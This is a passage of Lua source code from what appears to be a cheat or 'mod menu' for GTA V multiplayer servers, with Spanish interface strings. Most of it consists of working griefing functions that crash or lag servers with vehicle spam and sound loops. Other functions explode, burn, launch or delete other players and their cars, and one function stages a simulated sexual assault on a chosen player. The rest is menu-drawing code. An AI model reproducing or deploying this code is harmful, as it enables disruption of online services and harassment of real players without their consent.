
                    crash_loop = nil



                    return

                else

                    self:AddNotification("ERROR", "Failed to cleanup " .. #crash_model_list .. " crash object" .. (#crash_model_list ~= 1 and "s" or "") .. ". Retrying in 5 seconds.")

                    Wait(5000)

                end

            end

        end)

    end



    function PCCT:RapePlayer(player)

        if self.Config.SafeMode then return self:AddNotification("AVISO", "Modo seguro activado, desactivalo para poder usarlo") end



        CreateThread(function()

            local model = self.FreeCam.SpawnerOptions.PED[picho.math.random(1, #self.FreeCam.SpawnerOptions.PED)]

            self:RequestModelSync(model)

            self:GetFunction("RequestAnimpicho")("rcmpaparazzo_2")



            while not self:GetFunction("HasAnimpichoLoaded")("rcmpaparazzo_2") do

                Wait(0)

            end



            if self:GetFunction("IsPedInAnyVehicle")(self:GetFunction("GetPlayerPed")(player), true) then

                local veh = self:GetFunction("GetVehiclePedIsIn")(self:GetFunction("GetPlayerPed")(player), true)



                if not self.Config.SafeMode then

                    self:GetFunction("ClearPedTasksImmediately")(self:GetFunction("GetPlayerPed")(player))

                end



                while not self:GetFunction("NetworkHasControlOfEntity")(veh) do

                    self:GetFunction("NetworkRequestControlOfEntity")(veh)

                    Wait(0)

                end



                self:GetFunction("SetEntityAsMissionEntity")(veh, true, true)

                self:GetFunction("DeleteVehicle")(veh)

                self:GetFunction("DeleteEntity")(veh)

            end



            local count = -0.2



            for _ = 1, 3 do

                local c = self:GetFunction("GetOffsetFromEntityInWorldCoords")(self:GetFunction("GetPlayerPed")(player), 0.0, 0.0, 0.0)

                local x, y, z = c.x, c.y, c.z

                local rape_ped = self:GetFunction("CreatePed")(4, self:GetFunction("GetHashKey")(model), x, y, z, 0.0, true, false)

                self:GetFunction("SetEntityAsMissionEntity")(rape_ped, true, true)

                self:GetFunction("AttachEntityToEntity")(rape_ped, self:GetFunction("GetPlayerPed")(player), 4103, 11816, count, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)

                self:GetFunction("ClearPedTasks")(self:GetFunction("GetPlayerPed")(player))

                self:GetFunction("TaskPlayAnim")(self:GetFunction("GetPlayerPed")(player), "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0)

                self:GetFunction("SetPedKeepTask")(rape_ped)

                self:GetFunction("SetPedAlertness")(rape_ped, 0.0)

                self:GetFunction("TaskPlayAnim")(rape_ped, "rcmpaparazzo_2", "shag_loop_a", 2.0, 2.5, -1, 49, 0, 0, 0, 0)

                self:GetFunction("SetEntityInvincible")(rape_ped, true)

                count = count - 0.4

            end

        end)

    end



    local car_spam = {"asea", "adder", "dinghy", "biff", "rhapsody", "ruiner", "picador", "sabregt", "baller4", "emperor", "ingot", "primo2", "velum2", "vestra", "baller", "fq2", "dubsta", "patriot", "rocoto", "primo", "stratum", "surge", "tailgater", "washington", "airbus", "tourbus", "taxi", "rentalbus", "banshee", "blista2", "bestiagts", "blistveh", "comet2", "buffalo", "coquette", "ninef", "dodo", "trash2", "radi", "jester", "jet", "tug", "bus", "dump"}



    function PCCT:GetVehicleHashFromModel(model)

        for i = 1, #car_spam do

            if model == self:GetFunction("GetHashKey")(car_spam[i]) then return car_spam[i] end

        end

    end



    function PCCT:CarSpamServer()

        if self.Config.SafeMode then return self:AddNotification("AVISO", "Modo seguro activado, desactivalo para poder usarlo") end



        CreateThread(function()

            for _, hash in picho.ipairs(car_spam) do

                self:RequestModelSync(hash)



                for _, src in picho.pairs(self.PlayerCache) do

                    src = picho.tonumber(src)



                    if src ~= self.NetworkID or self.Config.OnlineIncludeSelf then

                        local ped = self:GetFunction("GetPlayerPed")(src)

                        local coords = self:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)

                        self:GetFunction("CreateVehicle")(self:GetFunction("GetHashKey")(hash), coords.x, coords.y, coords.z, self:GetFunction("GetEntityHeading")(ped), true, false)

                    end



                    Wait(5)

                end



                Wait(5)

            end

        end)

    end



    local _use_lag_server

    local _use_earrape_loop

    local _use_hydrant_loop

    local _use_fire_loop

    local _use_taze_loop

    local _use_delete_loop

    local _use_explode_vehicle_loop

    local _use_explode_player_loop

    local _use_launch_loop



    function PCCT:LaggingServer()

        if self.Config.SafeMode then return self:AddNotification("AVISO", "Modo seguro activado, desactivalo para poder usarlo") end



        CreateThread(function()

            while _use_lag_server do

                for _, hash in picho.ipairs(car_spam) do

                    self:RequestModelSync(hash)





                    Wait(5)

                end



                Wait(20)

            end

        end)

    end



    function PCCT:EarrapeServer()

        if self.Config.SafeMode then return self:AddNotification("AVISO", "Modo seguro activado, desactivalo para poder usarlo") end



        CreateThread(function()

            while _use_earrape_loop do

                PCCT:GetFunction("PlaySound")(-1, "Checkpoint_Hit", "GTAO_FM_Events_Soundset", true)
                PCCT:GetFunction("PlaySound")(-1, "Boss_Blipped", "GTAO_Magnate_Hunt_Boss_SoundSet", true)
                PCCT:GetFunction("PlaySound")(-1, "Bomb_Disarmed", "GTAO_Speed_Convoy_Soundset", true)
                PCCT:GetFunction("PlaySound")(-1, "CLICK_BACK", "SHORT_PLAYER_SWITCH_SOUND_SET", true)
                PCCT:GetFunction("PlaySound")(-1, "All", "HUD_MINI_GAME_SOUNDSET", true)

                PCCT:GetFunction("PlaySound")(-1, "Beep_Green", "DLC_HEIST_HACKING_SNAKE_SOUNDS", true)
            end

        end)

    end



    function PCCT:HydrantLoop()

        if self.Config.SafeMode then return self:AddNotification("AVISO", "Modo seguro activado, desactivalo para poder usarlo") end



        CreateThread(function()

            while _use_hydrant_loop do

                for _, src in picho.pairs(self.PlayerCache) do

                    if not _use_hydrant_loop then break end

                    src = picho.tonumber(src)



                    if src ~= self.NetworkID or self.Config.OnlineIncludeSelf then

                        self:HydrantPlayer(src)

                    end



                    Wait(1)

                end



                Wait(5)

            end

        end)

    end



    function PCCT:FireLoop()

        if self.Config.SafeMode then return self:AddNotification("AVISO", "Modo seguro activado, desactivalo para poder usarlo") end



        CreateThread(function()

            while _use_fire_loop do

                for _, src in picho.pairs(self.PlayerCache) do

                    if not _use_fire_loop then break end

                    src = picho.tonumber(src)



                    if src ~= self.NetworkID or self.Config.OnlineIncludeSelf then

                        self:FirePlayer(src)

                    end



                    Wait(1)

                end



                Wait(5)

            end

        end)

    end



    function PCCT:DeleteLoop()

        if self.Config.SafeMode then return self:AddNotification("AVISO", "Modo seguro activado, desactivalo para poder usarlo") end



        CreateThread(function()

            while _use_delete_loop do

                local _veh = self:GetFunction("IsPedInAnyVehicle") and self:GetFunction("GetVehiclePedIsIn")(self.LocalPlayer)



                for veh in self:EnumerateVehicles() do

                    if not _use_delete_loop then break end



                    if veh ~= _veh or self.Config.OnlineIncludeSelf then

                        self.Util:DeleteEntity(veh)

                    end



                    Wait(1)

                end



                Wait(5)

            end

        end)

    end



    function PCCT:ExplodeVehicleLoop()

        if self.Config.SafeMode then return self:AddNotification("AVISO", "Modo seguro activado, desactivalo para poder usarlo") end



        CreateThread(function()

            while _use_explode_vehicle_loop do

                local _veh = self:GetFunction("IsPedInAnyVehicle") and self:GetFunction("GetVehiclePedIsIn")(self.LocalPlayer)



                for veh in self:EnumerateVehicles() do

                    if not _use_explode_vehicle_loop then break end



                    if veh ~= _veh or self.Config.OnlineIncludeSelf then

                        self:GetFunction("NetworkExplodeVehicle")(veh, true, false, false)

                        self:GetFunction("AddExplosion")(self:GetFunction("GetOffsetFromEntityInWorldCoords")(veh, 0.0, 0.0, 0.0), 7, 100000.0, true, false, 0.0)

                    end



                    Wait(1)

                end



                Wait(5)

            end

        end)

    end



    function PCCT:ExplodePlayerLoop()

        if self.Config.SafeMode then return self:AddNotification("AVISO", "Modo seguro activado, desactivalo para poder usarlo") end



        CreateThread(function()

            while _use_explode_player_loop do

                for _, src in picho.pairs(self.PlayerCache) do

                    if not _use_explode_player_loop then break end

                    src = picho.tonumber(src)



                    if src ~= self.NetworkID or self.Config.OnlineIncludeSelf then

                        self:GetFunction("AddExplosion")(self:GetFunction("GetOffsetFromEntityInWorldCoords")(self:GetFunction("GetPlayerPed")(src), 0.0, 0.0, 0.0), 7, 100000.0, true, false, 0.0)

                    end



                    Wait(1)

                end



                Wait(5)

            end

        end)

    end



    function PCCT:LaunchLoop()

        if self.Config.SafeMode then return self:AddNotification("AVISO", "Modo seguro activado, desactivalo para poder usarlo") end



        CreateThread(function()

            while _use_launch_loop do

                local _veh = self:GetFunction("IsPedInAnyVehicle") and self:GetFunction("GetVehiclePedIsIn")(self.LocalPlayer)



                for veh in self:EnumerateVehicles() do

                    if not _use_launch_loop then break end



                    if veh ~= _veh or self.Config.OnlineIncludeSelf then

                        if self:RequestControlSync(veh) then

                            self:GetFunction("ApplyForceToEntity")(veh, 3, 0.0, 0.0, 9999999.0, 0.0, 0.0, 0.0, true, true, true, true, false, true)

                        end

                    end



                    Wait(1)

                end



                Wait(5)

            end

        end)

    end



    function PCCT:DisableLoop()

        if self.Config.SafeMode then return self:AddNotification("AVISO", "Modo seguro activado, desactivalo para poder usarlo") end



        CreateThread(function()

            while _use_launch_loop do

                local _veh = self:GetFunction("IsPedInAnyVehicle") and self:GetFunction("GetVehiclePedIsIn")(self.LocalPlayer)



                for veh in self:EnumerateVehicles() do

                    if not _use_launch_loop then break end



                    if veh ~= _veh or self.Config.OnlineIncludeSelf then

                        if self:RequestControlSync(veh) then

                            self:GetFunction("SetEntityAsMissionEntity")(veh, false, false)

                            self:GetFunction("StartVehicleAlarm")(veh)

                            self:GetFunction("DetachVehicleWindscreen")(veh)

                            self:GetFunction("SetVehicleLights")(veh, 1)

                            self:GetFunction("SetVehicleLightsMode")(veh, 1)

                            self:GetFunction("SetVehicleBurnout")(veh, true)

                            self:GetFunction("SetVehicleGravityAmount")(veh, math.huge)

                            self:GetFunction("SetVehicleSteeringScale")(veh, 100.0)

                            self:GetFunction("SetVehicleHandlingFloat")(veh, "CHandlingData", "fDriveBiasFront", 0.9)

                            self:GetFunction("SetVehicleSteerBias")(veh, 1.0)



                            for i = 0, self:GetFunction("GetVehicleNumberOfWheels")(veh) do

                                self:GetFunction("SetVehicleTyreBurst")(veh, i, false, 1000.0)

                            end

                        end

                    end



                    Wait(1)

                end



                Wait(5)

            end

        end)

    end



    function PCCT:SpawnPed(where, heading, model, weapon)

        if not self:RequestModelSync(model) then return self:AddNotification("ERROR", "Couldn't load model ~r~" .. model .. " ~s~in time.", 2500) end

        local ped = self:GetFunction("CreatePed")(4, self:GetFunction("GetHashKey")(model), where.x, where.y, where.z, heading or 0.0, true, true)

        self:GetFunction("SetNetworkIdCanMigrate")(self:GetFunction("NetworkGetNetworkIdFromEntity")(ped), true)

        self:GetFunction("NetworkSetNetworkIdDynamic")(self:GetFunction("NetworkGetNetworkIdFromEntity")(ped), false)



        if weapon then

            self:GetFunction("GiveWeaponToPed")(ped, self:GetFunction("GetHashKey")(weapon), 9000, false, true)

        end



        self:GetFunction("SetPedAccuracy")(ped, 100)



        return ped

    end



    function PCCT:UnlockVehicle(veh, lock)

        CreateThread(function()

            if not self:GetFunction("DoesEntityExist")(veh) or not self:GetFunction("IsEntityAVehicle")(veh) then return end

            if not self:RequestControlSync(veh) then return self:AddNotification("ERROR", "Failed to get network control in time. Please try again.", 5000) end

            self:GetFunction("SetVehicleDoorsLockedForAllPlayers")(veh, lock)

            self:GetFunction("SetVehicleDoorsLockedForPlayer")(veh, self.NetworkID, lock)

            self:GetFunction("SetVehicleDoorsLocked")(veh, lock)

            self:AddNotification("EXITO", "Vehiculo " .. (lock and "bloqueado" or "desbloqueado") .. ".", 5000)

        end)

    end



    function PCCT:DisableVehicle(veh)

        CreateThread(function()

            if not self:GetFunction("DoesEntityExist")(veh) or not self:GetFunction("IsEntityAVehicle")(veh) then return end

            if not self:RequestControlSync(veh) then return self:AddNotification("ERROR", "Failed to get network control in time. Please try again.", 5000) end

            self:GetFunction("SetEntityAsMissionEntity")(veh, false, false)

            self:GetFunction("StartVehicleAlarm")(veh)

            self:GetFunction("DetachVehicleWindscreen")(veh)

            self:GetFunction("SetVehicleLights")(veh, 1)

            self:GetFunction("SetVehicleLightsMode")(veh, 1)

            self:GetFunction("SetVehicleBurnout")(veh, true)

            self:GetFunction("SetVehicleGravityAmount")(veh, math.huge)

            self:GetFunction("SetVehicleSteeringScale")(veh, 100.0)

            self:GetFunction("SetVehicleHandlingFloat")(veh, "CHandlingData", "fDriveBiasFront", 0.9)

            self:GetFunction("SetVehicleSteerBias")(veh, 1.0)



            for i = 0, self:GetFunction("GetVehicleNumberOfWheels")(veh) do

                self:GetFunction("SetVehicleTyreBurst")(veh, i, false, 1000.0)

            end



            self:AddNotification("EXITO", "Vehiculo destrosado.", 5000)

        end)

    end



    function PCCT:StealVehicleThread(who, veh, nodrive)

        if not self:GetFunction("DoesEntityExist")(veh) or not self:GetFunction("IsEntityAVehicle")(veh) then return end

        self:GetFunction("TaskSetBlockingOfNonTemporaryEvents")(who, true)

        self:GetFunction("ClearPedTasks")(who)

        local driver = self:GetFunction("GetPedInVehicleSeat")(veh, -1)

        local timeout = 0



        if self:GetFunction("DoesEntityExist")(driver) then

            while self:GetFunction("DoesEntityExist")(veh) and self:GetFunction("GetPedInVehicleSeat")(veh, -1) == driver and timeout <= 25000 do

                self:GetFunction("TaskCombatPed")(who, driver, 0, 16)

                timeout = timeout + 100

                self:GetFunction("NetworkRequestControlOfEntity")(veh)

                self:GetFunction("SetVehicleDoorsLockedForAllPlayers")(veh, false)

                self:GetFunction("SetVehicleDoorsLocked")(veh, 7)



                if self:GetFunction("IsDisabledControlPressed")(0, self.Keys["R"]) then

                    self.Util:DeleteEntity(who)

                    self:AddNotification("INFO", "Hijack cancelled.")



                    return false

                end



                Wait(100)

            end



            self:GetFunction("ClearPedTasks")(who)

            self:GetFunction("TaskEnterVehicle")(who, veh, 10000, -1, 2.0, 1, 0)



            while self:GetFunction("DoesEntityExist")(veh) and self:GetFunction("GetPedInVehicleSeat")(veh, -1) ~= who and timeout <= 25000 do

                timeout = timeout + 100

                self:GetFunction("NetworkRequestControlOfEntity")(veh)

                self:GetFunction("SetVehicleDoorsLockedForAllPlayers")(veh, false)

                self:GetFunction("SetVehicleDoorsLocked")(veh, 7)



                if self:GetFunction("IsDisabledControlPressed")(0, self.Keys["R"]) then

                    self.Util:DeleteEntity(who)

                    self:AddNotification("INFO", "Hijack cancelled.")



                    return false

                end



                Wait(100)

            end

        else

            self:GetFunction("ClearPedTasks")(who)

            self:GetFunction("TaskEnterVehicle")(who, veh, 10000, -1, 2.0, 1, 0)



            while self:GetFunction("DoesEntityExist")(veh) and self:GetFunction("GetPedInVehicleSeat")(veh, -1) ~= who and timeout <= 25000 do

                timeout = timeout + 100

                self:GetFunction("SetVehicleDoorsLockedForAllPlayers")(veh, false)

                self:GetFunction("SetVehicleDoorsLocked")(veh, 7)

                self:GetFunction("NetworkRequestControlOfEntity")(veh)



                if self:GetFunction("IsDisabledControlPressed")(0, self.Keys["R"]) then

                    self.Util:DeleteEntity(who)

                    self:AddNotification("INFO", "Hijack cancelled.")



                    return false

                end



                Wait(100)

            end

        end



        self:GetFunction("ClearPedTasks")(who)

        self:GetFunction("TaskSetBlockingOfNonTemporaryEvents")(who, false)

        self:GetFunction("SetVehicleEngineOn")(veh, true)

        self:GetFunction("NetworkRequestControlOfEntity")(veh)



        if not nodrive then

            for i = 1, 5 do

                self:GetFunction("TaskVehicleDriveWander")(who, veh, 120.0, 0)

            end

        end



        self:GetFunction("SetVehicleDoorsLockedForAllPlayers")(veh, true)

        self:GetFunction("SetVehicleDoorsLocked")(veh, 2)



        return true

    end



    function PCCT:ScrW()

        return self._ScrW

    end



    function PCCT:ScrH()

        return self._ScrH

    end



    local print = _print or print



    function PCCT:Print(...)

        local str = (...)

        if not self.Config.UsePrintMessages then return false end

        print("[" .. self.Name .. "] " .. str)



        return true

    end



    function PCCT:GetMousePos()

        return self._MouseX, self._MouseY

    end



    function PCCT:RequestControlOnce(entity)

        if self:GetFunction("NetworkHasControlOfEntity")(entity) then return true end

        self:GetFunction("SetNetworkIdCanMigrate")(self:GetFunction("NetworkGetNetworkIdFromEntity")(entity), true)



        return self:GetFunction("NetworkRequestControlOfEntity")(entity)

    end



    function PCCT:RequestControlSync(veh, timeout)

        timeout = timeout or 2000

        local counter = 0

        self:RequestControlOnce(veh)



        while not self:GetFunction("NetworkHasControlOfEntity")(veh) do

            counter = counter + 100

            Wait(100)

            if counter >= timeout then return false end

        end



        return true

    end



    local entityEnumerator = {

        __gc = function(enum)

            if enum.destructor and enum.handle then

                enum.destructor(enum.handle)

            end



            enum.destructor = nil

            enum.handle = nil

        end

    }



    function PCCT:EnumerateEntities(initFunc, moveFunc, disposeFunc)

        return coroutine.wrap(function()

            local iter, id = initFunc()



            if not id or id == 0 then

                disposeFunc(iter)



                return

            end



            local enum = {

                handle = iter,

                destructor = disposeFunc

            }



            setmetatable(enum, entityEnumerator)

            local next = true

            repeat

                coroutine.yield(id)

                next, id = moveFunc(iter)

            until not next

            enum.destructor, enum.handle = nil, nil

            disposeFunc(iter)

        end)

    end



    function PCCT:EnumerateVehicles()

        return self:EnumerateEntities(self:GetFunction("FindFirstVehicle"), self:GetFunction("FindNextVehicle"), self:GetFunction("EndFindVehicle"))

    end



    function PCCT:EnumeratePeds()

        return self:EnumerateEntities(self:GetFunction("FindFirstPed"), self:GetFunction("FindNextPed"), self:GetFunction("EndFindPed"))

    end



    function PCCT:EnumerateObjects()

        return self:EnumerateEntities(self:GetFunction("FindFirstObject"), self:GetFunction("FindNextObject"), self:GetFunction("EndFindObject"))

    end



    function PCCT:GetClosestVehicle(max_dist)

        local veh, dist = nil, picho.math.huge

        local cur = self:GetFunction("GetOffsetFromEntityInWorldCoords")(self.LocalPlayer, 0.0, 0.0, 0.0)



        for vehicle in self:EnumerateVehicles() do

            local this = self:GetFunction("GetOffsetFromEntityInWorldCoords")(vehicle, 0.0, 0.0, 0.0)



            if self:GetFunction("DoesEntityExist")(vehicle) then

                local distance = self:GetFunction("GetDistanceBetweenCoords")(cur.x, cur.y, cur.z, this.x, this.y, this.z)



                if distance < dist then

                    dist = distance

                    veh = vehicle

                end

            end

        end



        if dist > (max_dist or 10.0) then return end



        return veh, dist

    end



    function PCCT:GetClosestPed(max_dist)

        local ped, dist = nil, picho.math.huge

        local cur = self:GetFunction("GetOffsetFromEntityInWorldCoords")(self.LocalPlayer, 0.0, 0.0, 0.0)



        for pedestrian in self:EnumeratePeds() do

            local this = self:GetFunction("GetOffsetFromEntityInWorldCoords")(pedestrian, 0.0, 0.0, 0.0)



            if self:GetFunction("DoesEntityExist")(pedestrian) then

                local distance = self:GetFunction("GetDistanceBetweenCoords")(cur.x, cur.y, cur.z, this.x, this.y, this.z)



                if distance < dist then

                    dist = distance

                    ped = pedestrian

                end

            end

        end



        if dist > (max_dist or 10.0) then return end



        return ped, dist

    end



    function PCCT:GetClosestPeds()

        local list = {}



        for ped in self:EnumeratePeds() do

            list[ped] = {

                ped = ped,

                dist = self:GetFunction("GetDistanceBetweenCoords")(self:GetFunction("GetEntityCoords")(self.LocalPlayer).xyz, self:GetFunction("GetEntityCoords")(ped).xyz, true)

            }

        end



        picho.table.sort(list, function(a, b) return a.dist < b.dist end)



        return picho.pairs(list)

    end



    function PCCT:GetClosestObject(max_dist)

        local obj, dist = nil, picho.math.huge

        local cur = self:GetFunction("GetOffsetFromEntityInWorldCoords")(self.LocalPlayer, 0.0, 0.0, 0.0)



        for object in self:EnumeratePeds() do

            local this = self:GetFunction("GetOffsetFromEntityInWorldCoords")(object, 0.0, 0.0, 0.0)



            if self:GetFunction("DoesEntityExist")(object) then

                local distance = self:GetFunction("GetDistanceBetweenCoords")(cur.x, cur.y, cur.z, this.x, this.y, this.z)



                if distance < dist then

                    dist = distance

                    obj = object

                end

            end

        end



        if dist > (max_dist or 10.0) then return end



        return obj, dist

    end



    function PCCT:DeleteVehicles()

        local _veh = self:GetFunction("IsPedInAnyVehicle") and self:GetFunction("GetVehiclePedIsIn")(self.LocalPlayer)



        CreateThread(function()

            for veh in self:EnumerateVehicles() do

                if self:RequestControlSync(veh) and (veh ~= _veh or self.Config.OnlineIncludeSelf) then

                    self.Util:DeleteEntity(veh)

                end

            end

        end)

    end



    function PCCT:RepairVehicle(vehicle)

        if vehicle == 0 then return false end

        self:RequestControlOnce(vehicle)

        self:GetFunction("SetVehicleFixed")(vehicle)



        return true

    end



    local was_dragging



    function PCCT:TranslateMouse(wx, wy, ww, wh, drag_id)

        local mx, my = self:GetMousePos()



        if not self.DraggingX and not self.DraggingY then

            self.DraggingX = mx

            self.DraggingY = my

        end



        local mpx = self.DraggingX - wx

        local mpy = self.DraggingY - wy



        if self.DraggingX ~= mx or self.DraggingY ~= my then

            self.DraggingX = mx

            self.DraggingY = my

        end



        local dx = wx - (self.DraggingX - mpx)

        local dy = wy - (self.DraggingY - mpy)

        was_dragging = drag_id



        return wx - dx, wy - dy

    end



    local scroller_y



    function PCCT:TranslateScroller(sy, sh, by)

        local _, my = self:GetMousePos()



        if not scroller_y then

            scroller_y = my

        end



        local mpy = scroller_y - sy



        if scroller_y ~= my then

            scroller_y = my

        end



        return mpy

    end



    local text_cache = {}



    local function _text_width(str, font, scale)

        if not str then return 0.0 end

        font = font or 4

        scale = scale or 0.35

        if text_cache[font] and text_cache[font][scale] and text_cache[font][scale][str] then return text_cache[font][scale][str].length end

        text_cache[font] = text_cache[font] or {}

        text_cache[font][scale] = text_cache[font][scale] or {}

        PCCT:GetFunction("BeginTextCommandWidth")("STRING")

        PCCT:GetFunction("AddTextComponentSubstringPlayerName")(str)

        PCCT:GetFunction("SetTextFont")(font or 4)

        PCCT:GetFunction("SetTextScale")(scale or 0.35, scale or 0.35)

        local length = PCCT:GetFunction("EndTextCommandGetWidth")(1)



        text_cache[font][scale][str] = {

            length = length

        }



        return length

    end



    function PCCT.Painter:GetTextWidth(str, font, scale)

        return _text_width(str, font, scale) * PCCT:ScrW()

    end



    function PCCT.Painter:DrawText(text, font, centered, x, y, scale, r, g, b, a)

        PCCT:GetFunction("SetTextFont")(font)

        PCCT:GetFunction("SetTextScale")(scale, scale)

        PCCT:GetFunction("SetTextCentre")(centered)

        PCCT:GetFunction("SetTextColour")(r, g, b, a)

        PCCT:GetFunction("BeginTextCommandDisplayText")("STRING")

        PCCT:GetFunction("AddTextComponentSubstringPlayerName")(text)

        PCCT:GetFunction("EndTextCommandDisplayText")(x / PCCT:ScrW(), y / PCCT:ScrH())

    end



    local listing



    local function _lerp(delta, from, to)

        if delta > 1 then return to end

        if delta < 0 then return from end



        return from + (to - from) * delta

    end



    local color_lists = {}



    function PCCT.Painter:ListItem(label, px, py, x, y, w, h, r, g, b, a, id)

        if listing and not PCCT:GetFunction("IsDisabledControlReleased")(0, 24) then

            listing = nil

        end



        if not w or w <= 0 then

            w = self:GetTextWidth(label, 4, size or 0.37)

        end



        if not color_lists[id] then

            color_lists[id] = {

                r = 0,

                g = 0,

                b = 0

            }

        end



        local bool = PCCT.Config.SelectedCategory == id



        if bool then

            color_lists[id].r = _lerp(0.1, color_lists[id].r, PCCT.Config.Tertiary[1])

            color_lists[id].g = _lerp(0.1, color_lists[id].g, PCCT.Config.Tertiary[2])

            color_lists[id].b = _lerp(0.1, color_lists[id].b, PCCT.Config.Tertiary[3])

        else

            color_lists[id].r = _lerp(0.1, color_lists[id].r, 255)

            color_lists[id].g = _lerp(0.1, color_lists[id].g, 255)

            color_lists[id].b = _lerp(0.1, color_lists[id].b, 255)

        end



        self:DrawRect(px + x, py + y, w, h, r, g, b, a)

        self:DrawText(label, 4, true, px + w / 2, py + y - 5, 0.34, picho.math.ceil(color_lists[id].r), picho.math.ceil(color_lists[id].g), picho.math.ceil(color_lists[id].b), 255)



        if self:Holding(px + x, py + y, w, h, id) or PCCT.Config.SelectedCategory == id then

            if not listing and PCCT.Config.SelectedCategory ~= id then

                listing = true



                return true

            else

                return false

            end

        end



        return false

    end



    local selector

    local list_choices = {}



    function PCCT.Painter:DrawSprite(x, y, w, h, heading, picho, name, r, g, b, a, custom)

        if not PCCT:GetFunction("HasStreamedTexturepichoLoaded")(picho) and not custom then

            PCCT:GetFunction("RequestStreamedTexturepicho")(picho)

        end



        PCCT:GetFunction("DrawSprite")(picho, name, x / PCCT:ScrW(), y / PCCT:ScrH(), w / PCCT:ScrW(), h / PCCT:ScrH(), heading, r, g, b, a)

    end



    local left_active, right_active



    function PCCT.Painter:ListChoice(label, options, px, py, x, y, w, h, r, g, b, a, id, selected, unbind_caller)

        list_choices[id] = list_choices[id] or {

            selected = selected or 1,

            options = options

        }



        if not w or w <= 0 then

            w = self:GetTextWidth(label, 4, size or 0.37)

        end



        local ret

        local lR, lG, lB = 255, 255, 255

        local rR, rG, rB = 255, 255, 255

        self:DrawText(label, 4, false, px + x, py + y, 0.4, 255, 255, 255, 255)

        local width = self:GetTextWidth(label, 4, 0.4)

        local left_x, left_y = px + x + (width - 16.0), py + y + 13



        if self:Holding(left_x + 18 - 9.1, left_y - 5, 38.4, 19.2, 13.5, id .. "_left") then

            if not left_active or left_active == id .. "_left" then

                lR, lG, lB = PCCT.Config.Tertiary[1], PCCT.Config.Tertiary[2], PCCT.Config.Tertiary[3]

            end



            if not left_active then

                left_active = id .. "_left"

                local cur = list_choices[id].selected

                local new = cur - 1



                if not list_choices[id].options[new] then

                    new = #list_choices[id].options

                end



                list_choices[id].selected = new

                ret = true

            end

        elseif left_active == id .. "_left" then

            left_active = nil

        end



        local cur = list_choices[id].options[list_choices[id].selected]



        if not cur then

            cur = "NONE"

        end



        local cur_width = self:GetTextWidth(cur, 4, 0.4)



        if self:Holding(left_x + 18 + cur_width + 16.0 - 9.1, left_y - 5, 19.2, 13.5, id .. "_right") then

            if not right_active or right_active == id .. "_right" then

                rR, rG, rB = PCCT.Config.Tertiary[1], PCCT.Config.Tertiary[2], PCCT.Config.Tertiary[3]

            end



            if not right_active then

                right_active = id .. "_right"

                local cur = list_choices[id].selected

                local new = cur + 1



                if not list_choices[id].options[new] then

                    new = 1

                end



                list_choices[id].selected = new

                ret = true

            end

        elseif right_active == id .. "_right" then

            right_active = nil

        end



        self:DrawText(cur, 4, false, left_x + 27, left_y - 14, 0.4, 255, 255, 255, 255)

        self:DrawSprite(left_x + 18, left_y + 2, 38.4, 27.0, 0.0, "commonmenu", "arrowleft", lR, lG, lB, 255)

        self:DrawSprite(left_x + 18 + cur_width + 16.0, left_y + 2, 38.4, 27.0, 0.0, "commonmenu", "arrowright", rR, rG, rB, 255)



        if self:Hovered(px + x, py + y + 8, width + 27 + cur_width, 10) and unbind_caller and PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["MOUSE2"]) and PCCT.Config[unbind_caller] ~= "NONE" then

            PCCT.Config[unbind_caller] = "NONE"

            list_choices[id].selected = -1

            PCCT.ConfigClass.Save(true)

            ret = false

        end



        return ret

    end



    local checked

    local color_checks = {}



    function PCCT.Painter:CheckBox(label, bool, px, py, x, y, w, h, r, g, b, a, id, centered, size)

        if not PCCT:GetFunction("IsDisabledControlPressed")(0, 24) and checked then

            checked = nil

        end



        if not w or w <= 0 then

            w = self:GetTextWidth(label, 4, size or 0.37)

        end



        if not color_checks[id] then

            color_checks[id] = {

                r = 0,

                g = 0,

                b = 0,

                a = 0

            }

        end



        self:DrawRect(px + x, py + y, 20, 20, 25, 25, 25, 200)



        if bool then

            color_checks[id].r = _lerp(0.1, color_checks[id].r, PCCT.Config.Tertiary[1])

            color_checks[id].g = _lerp(0.1, color_checks[id].g, PCCT.Config.Tertiary[2])

            color_checks[id].b = _lerp(0.1, color_checks[id].b, PCCT.Config.Tertiary[3])

            color_checks[id].a = _lerp(0.1, color_checks[id].a, 200)

        else

            color_checks[id].r = _lerp(0.1, color_checks[id].r, 20)

            color_checks[id].g = _lerp(0.1, color_checks[id].g, 20)

            color_checks[id].b = _lerp(0.1, color_checks[id].b, 20)

            color_checks[id].a = _lerp(0.1, color_checks[id].a, 0)

        end



        self:DrawRect(px + x + 2.5, py + y + 2.5, 15, 15, picho.math.ceil(color_checks[id].r), picho.math.ceil(color_checks[id].g), picho.math.ceil(color_checks[id].b), picho.math.ceil(color_checks[id].a))

        self:DrawText(label, 4, centered, centered and (px + w / 2) or (px + x + 25), py + y - 4, size or 0.37, r, g, b, a)



        if self:Holding(px + x, py + y, w, h, id) then

            if not checked then

                checked = id



                if PCCT.Config.UseSounds then

                    PCCT:GetFunction("PlaySoundFrontend")(-1, "CLICK_BACK", "WEB_NAVIGATION_SOUNDS_PHONE", false)

                end



                return true

            else

                return false

            end

        end



        return false

    end



    local activated

    local buttons = {}



    function PCCT.Painter:Button(label, px, py, x, y, w, h, r, g, b, a, id, centered, size)

        if not PCCT:GetFunction("IsDisabledControlPressed")(0, 24) and activated then

            activated = nil

        end



        if not w or w <= 0 then

            w = self:GetTextWidth(label, 4, size or 0.37)

        end



        buttons[id] = buttons[id] or {

            x = px + x,

            y = py + y,

            w = w,

            h = h

        }



        if self:Holding(px + x, py + y, w, h, id) then

            self:DrawText(label, 4, centered, centered and (px + w / 2) or (px + x), py + y, size or 0.37, PCCT.Config.Tertiary[1], PCCT.Config.Tertiary[2], PCCT.Config.Tertiary[3], PCCT.Config.Tertiary[4])



            if not activated then

                activated = id



                if PCCT.Config.UseSounds then

                    PCCT:GetFunction("PlaySoundFrontend")(-1, "CLICK_BACK", "WEB_NAVIGATION_SOUNDS_PHONE", false)

                end



                return true

            else

                return false

            end

        end



        self:DrawText(label, 4, centered, centered and (px + w / 2) or (px + x), py + y, size or 0.37, r, g, b, a)



        return false

    end



    function PCCT.Painter:DrawRect(x, y, w, h, r, g, b, a)

        local _w, _h = w / PCCT:ScrW(), h / PCCT:ScrH()

